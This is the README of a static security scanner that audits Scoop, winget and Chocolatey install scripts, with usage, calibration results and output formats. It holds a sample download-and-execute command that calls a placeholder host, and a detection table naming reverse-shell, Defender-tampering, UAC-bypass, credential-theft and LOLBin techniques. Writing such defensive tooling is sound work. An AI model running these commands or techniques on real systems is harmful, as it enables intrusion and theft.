# winpkg-audit

**Security-scan Scoop, winget and Chocolatey packages before you install them.** Zero dependencies, one file, MIT.
The Windows counterpart of [homebrew-audit](https://github.com/eltociear/homebrew-audit).

```powershell
python winpkg_audit.py --scoop-bucket someone/scoop-bucket     # a whole Scoop bucket (one tarball)
python winpkg_audit.py --scoop extras/vscode                    # one Scoop app
python winpkg_audit.py --choco googlechrome                     # a Chocolatey package (.nupkg)
python winpkg_audit.py --winget Microsoft.PowerToys             # latest winget manifest
python winpkg_audit.py .\bucket\ .\tools\chocolateyInstall.ps1 # local manifests / scripts / .nupkg
python winpkg_audit.py --text "iex (irm https://example.invalid/i.ps1)"
# 🔴 <text>  [CRITICAL]  score=25  (1 findings, 1 info)
#     CRITICAL Download & Execute (iex / pipe-to-shell) (L1, hook)
```

Runs on any Python 3.8+ (Windows, macOS, Linux). Nothing is installed and no package code is ever executed.

## Why this exists

`scoop checkup`, `winget validate` and Chocolatey's moderation validator check **structure and
conventions**. None of them ask what an install script actually does to your machine. A Scoop
`post_install`, a Chocolatey `chocolateyInstall.ps1` or a winget `InstallerSwitches` value is
PowerShell (or a command line) that runs with your rights - often elevated - the moment you
install. This scanner reads that code and the download/checksum posture around it.

| Pattern | Severity |
| --- | --- |
| Download & execute (`iex (iwr …)`, `DownloadString … \| iex`, `mshta http:`, `regsvr32 /i:http`) | CRITICAL |
| Encoded-then-executed payloads (`-EncodedCommand`, `FromBase64String` → `iex` / `Assembly::Load`) | CRITICAL |
| Defender tampering (`Set-MpPreference -Disable…`, `Add-MpPreference -Exclusion…`) | CRITICAL |
| Firewall / UAC / SmartScreen disabled machine-wide | CRITICAL |
| UAC-bypass registry hijacks (`ms-settings\shell\open\command`, …) | CRITICAL |
| Credential / browser-profile / wallet read **+** send to a non-forge host | CRITICAL |
| Reverse shell (`Net.Sockets.TCPClient` … `GetStream` … `iex`) | CRITICAL |
| Mark-of-the-Web stripping (`Unblock-File`, `Zone.Identifier` streams) - the Windows twin of macOS quarantine stripping | HIGH |
| Credential / browser-profile / wallet / SSH / cloud-key access | HIGH |
| LOLBin download or decode (`certutil -urlcache`, `certutil -decode`, `bitsadmin /transfer`) | HIGH |
| Persistent execution-policy weakening (`Set-ExecutionPolicy Bypass` without `-Scope Process`) | HIGH |
| TLS verification disabled (`ServerCertificateValidationCallback = {$true}`, `-SkipCertificateCheck`) | HIGH |
| Paste-site / chat-webhook / tunnel / file-drop / OAST hosts (pastebin raw, Discord webhooks & attachments, ngrok, transfer.sh, …) | HIGH |
| Plaintext `http://` download with no hash | HIGH |
| Unverified fetch-then-run (hook downloads a file outside the manifest's hashes, then executes it) | HIGH (MEDIUM for a pinned HTTPS release asset) |
| Hosts-file tampering, destructive commands (shadow-copy deletion, recursive deletes of user/system dirs) | HIGH |
| Run-key / scheduled-task / Startup-folder / WMI / IFEO persistence at install time | MEDIUM |
| Install-time fetch with no checksum, HTTPS download with no hash, obfuscated PowerShell, raw-IP hosts | MEDIUM |
| `http://` download that *is* hash-pinned | LOW |

23 scored patterns (90 signatures + 5 structural/combination rules), 10 informational ones. Deterministic, no LLM.

## Calibrated, not noisy

Every line is classified by **where it runs**:

- **install hook** - Scoop `pre_install` / `post_install` / `installer.script`, Chocolatey
  `chocolateyInstall.ps1` / `chocolateyBeforeModify.ps1` and helper scripts, winget switches;
- **uninstall hook** - Scoop `uninstaller.script` / `pre_uninstall` / `post_uninstall`,
  `chocolateyUninstall.ps1` (removing a Run key or a scheduled task there is cleanup, not persistence);
- **message** - `Write-Host` / `Write-Output` / Scoop `notes` (advice to the user, capped at MEDIUM);
- **metadata** - urls, hashes, winget fields. Comments and `<# … #>` blocks are ignored.

Capabilities every real package needs - downloads through Chocolatey's checksummed helpers,
running the vendor's own installer, PATH edits, specific firewall *rules*, services, registry
settings, `-ExecutionPolicy Bypass` for one child process - are reported as **INFO** and never touch
the score. A fetch-then-run is only HIGH when the downloaded file is the *command* being run (not
`7z x <file>`), and drops to MEDIUM when it is a pinned HTTPS release asset from a code forge.

Measured on 117,374 real manifests (full method and results in FINDINGS.md):

| Source | Targets | HIGH / CRITICAL | Misfires |
| --- | --- | --- | --- |
| Scoop official buckets (9) | 6,508 | 6 (0.09%) | 0 |
| Scoop community buckets (49) | 93,087 | 366 (0.39%) | 0 |
| winget-pkgs (latest of every package) | 16,502 | 0 | 0 |
| Chocolatey (top packages + 8 maintainer repos) | 1,277 | 12 (0.94%) | 0 |

Tuning on half the corpus surfaced 6 misfire classes and a held-out half one more; all are fixed
and every remaining HIGH/CRITICAL was read by hand and is a true pattern match - real
`iex (irm …)` in `post_install`, real Defender exclusions, real unhashed `http://` downloads.

**Full results: [FINDINGS.md](FINDINGS.md).**

## Usage

```text
python winpkg_audit.py <file|dir> [...]           Scoop .json / winget .yaml / .ps1 / .nupkg / dirs
python winpkg_audit.py --scoop-bucket owner/repo  whole Scoop bucket (GitHub tarball, no API quota)
python winpkg_audit.py --scoop app|bucket/app     ScoopInstaller/Main|Extras app, or a named bucket
python winpkg_audit.py --winget Publisher.App     latest installer manifest from microsoft/winget-pkgs
python winpkg_audit.py --choco id[@version]       package from community.chocolatey.org
python winpkg_audit.py --text "<powershell>"      snippet, scanned as an install hook
  --json      family JSON schema        --all      also list SAFE targets
  --sarif     SARIF 2.1.0               --verbose  show INFO context
  --fail-on {critical,high,medium,low,never}   exit 2 at that level (default high)
  --version
```

`GITHUB_TOKEN` is used for the one GitHub API call `--winget` makes (version listing), if set.

### In CI (bucket maintainers)

```yaml
- run: python winpkg_audit.py bucket/
```

Exit code 2 fails the job on any HIGH/CRITICAL manifest. See [Output formats and CI](#output-formats-and-ci) for SARIF upload and `--fail-on`.

## Honest limits

- **winget runs vendor installers.** A winget manifest is metadata: the risk lives inside the
  signed (or unsigned) `.exe`/`.msi` it points to, which this tool does not unpack. For winget it
  checks transport, hashes, hosts and switches - which is all the manifest controls.
- Chocolatey packages that **embed** their binaries are scanned for their scripts only.
- Static patterns, not a sandbox: a determined attacker can hide from regexes. Treat SAFE as
  "nothing known-bad in the install logic", not as a guarantee.

## Tests

```bash
python tests/run_tests.py   # inert canaries (one per pattern family) + benign controls
```

---

*Findings are pattern matches warranting human review, not verdicts. Report suspected malicious
packages to the bucket maintainer, the winget-pkgs repo, or Chocolatey's moderators.*

Related: [mcp-audit](https://github.com/eltociear/mcp-audit) · [npm-audit](https://github.com/eltociear/npm-audit) ·
[homebrew-audit](https://github.com/eltociear/homebrew-audit) · [skill-audit-mcp](https://github.com/eltociear/skill-audit-mcp)

## Output formats and CI

These flags are shared by every scanner in the eltociear `*-audit` family and behave the same way in each.

| flag | effect |
|---|---|
| `--json` | machine-readable report in the family schema `eltociear-audit/1` (below) |
| `--sarif` | SARIF 2.1.0 on stdout, for GitHub code scanning (`github/codeql-action/upload-sarif`) and other SARIF viewers |
| `--fail-on {critical,high,medium,low,never}` | exit `2` when any target reaches that level. Default `high`, which is the original behaviour. `never` always exits `0` |
| `--version` | prints `winpkg-audit <version>` |

Exit codes: `0` means no target reached the `--fail-on` level, `2` means at least one did, and `1` is a usage error. If a target can't be fetched or parsed, it's reported with `error` set (in SARIF, as a `toolExecutionNotifications` entry with `executionSuccessful: false`). An error alone doesn't change the exit code, so check `errors` in `--json` if a failed fetch should fail your job.

`--json` schema (`eltociear-audit/1`, one shape for the whole family):

```
{
  "schema": "eltociear-audit/1",
  "tool": {"name": "winpkg-audit", "version": "x.y.z"},
  "fail_on": "high", "exit_code": 2, "max_severity": "CRITICAL", "errors": 0,
  "results": [{
    "target": "...", "risk_level": "CRITICAL|HIGH|MEDIUM|LOW|SAFE", "risk_score": 0-100,
    "error": null, "counts": {"CRITICAL": 1, "HIGH": 0, "MEDIUM": 0, "LOW": 0},
    "findings": [{"rule_id": "...", "severity": "CRITICAL", "name": "...", "description": "...",
                  "file": "path/in/target", "line": 12, "matched": "...", "context": "..."}],
    "info": [ same shape, severity "INFO": capability context that never raises the risk ],
    "...": "scanner-specific extra fields, unchanged from earlier versions"
  }]
}
```

`results` is always a list, even when there's only one target. Each finding also keeps the scanner's own keys, such as `id`. In SARIF, `CRITICAL` and `HIGH` map to `error`, `MEDIUM` to `warning` and `LOW` to `note`. Rules carry a `security-severity` (9.5 / 8.0 / 5.5 / 3.0), and INFO context isn't emitted. For local targets, `artifactLocation.uri` is relative to the working directory, so run the scanner from the repository root.

```yaml
- run: python3 winpkg_audit.py . --sarif --fail-on never > winpkg-audit.sarif
- uses: github/codeql-action/upload-sarif@v3
  with: {sarif_file: winpkg-audit.sarif}
- run: python3 winpkg_audit.py . --fail-on high
```

Hostile input handling: archives are read in memory and never extracted to disk. Archive members whose names are traversal (`../`), absolute or drive-letter paths, or contain NUL are skipped. Symlink, hardlink, device and FIFO members are ignored. Each archive has a budget of decompressed bytes and members (bomb protection). Local directory walks only open regular files, so symlinks (including loops and links out of the tree), FIFOs and devices are never followed or read.
